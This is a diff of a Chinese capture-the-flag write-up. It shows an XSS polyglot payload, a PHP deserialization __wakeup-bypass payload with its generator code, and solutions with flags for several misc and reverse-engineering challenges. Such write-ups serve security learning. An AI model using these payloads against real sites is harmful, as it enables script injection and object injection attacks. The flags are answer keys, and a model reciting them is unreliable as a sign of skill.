@@ -158,6 +158,24 @@ hackbar 的 payload
 
 `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("flag") )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("flag")//>\x3e`
 
+## baby_ssrf
+
+
+## do_not_wakeup
+
+序列化得 `O:1:"A":1:{s:19:"Aare_you_a_hacker";s:9:"yesyesyes";}` ，修改绕过wakeup得 O:1:"A":1:{s:19:"Aare_you_a_hacker";s:9:"yesyesyes";} ，URL编码后payload如下： `data=O%3A1%3A%22A%22%3A5%3A%7Bs%3A19%3A%22%00A%00are_you_a_hacker%22%3Bs%3A9%3A%22yesyesyes%22%3B%7D`
+
+```php
+<?php
+class A
+{
+    private $are_you_a_hacker='yesyesyes';
+}
+$a=new A();
+echo(urlencode(serialize($a)));
+?>
+```
+
 ## sql2
 
 # misc
@@ -170,7 +188,7 @@ baseX Python爆破求解
 
 ## 一道简单的签到
 
-记事本打开搜索 swpu 得到flag
+记事本打开搜索 swpu 得到flag：`swpu{youfindthesecret!!}`
 
 ## xor
 
@@ -178,10 +196,79 @@ baseX Python爆破求解
 
 ## 64base
 
+```python
+import base64
+a = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/'
+b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+c = '2T3M3xJr3wqT4tfeuenTq9mNwBvOsdzJ1hQ='
+table = str.maketrans(a,b)
+d = c.translate(table)
+data = base64.b64decode(d)
+print(data)
+```
+
+`swpu{Qud7y1DPCwB31ZUrH6ml}`
+
 ## swpu_easy_android
 
 反编译得到 check 类，在 idea 中运行测试得到密码为 `f53720bd5d9f07a8dc1028df48b8e1bb` ，登录进下一个界面。
 
+## pyc大挑战
+
+`uncompyle6 -o rc4.py rc4.pyc` 反编译得到源码
+
+```python
+def init(key):
+    sBox = []
+    index = 0
+    k = []
+    for i in range(256):
+        sBox.append(i)
+        k.append(ord(key[(i % len(key))]))
+    for i in range(256):
+        index = (index + sBox[i] + k[i]) % 256
+        sBox[i], sBox[index] = sBox[index], sBox[i]
+    return sBox
+
+
+def rc4_crypt(data, sBox):
+    i = 0
+    j = 0
+    t = 0
+    for k in range(len(data)):
+        i = (i + 1) % 256
+        j = (j + sBox[i]) % 256
+        sBox[i], sBox[j] = sBox[j], sBox[i]
+        t = (sBox[i] + sBox[j]) % 256
+        data[k] ^= sBox[t]
+    return data
+
+
+def data_to_str(data):
+    str = ''
+    for i in range(len(data)):
+        str += chr(data[i])
+    return str
+
+
+def str_to_data(str):
+    d = []
+    for i in range(len(str)):
+        d.append(ord(str[i]))
+    return d
+
+
+data = [ 115, 119, 112, 117, 123, 114, 99, 52, 95, 49, 115, 95, 101, 52, 115, 121, 125]
+flag = input('请输入flag：')
+key = 'wllm'
+sBox = init(key)
+flag = str_to_data(flag)
+res = rc4_crypt(flag, sBox)
+if flag == res:
+    print('yes')
+else:
+    print('wrong')
+```
 
 # crypto
 
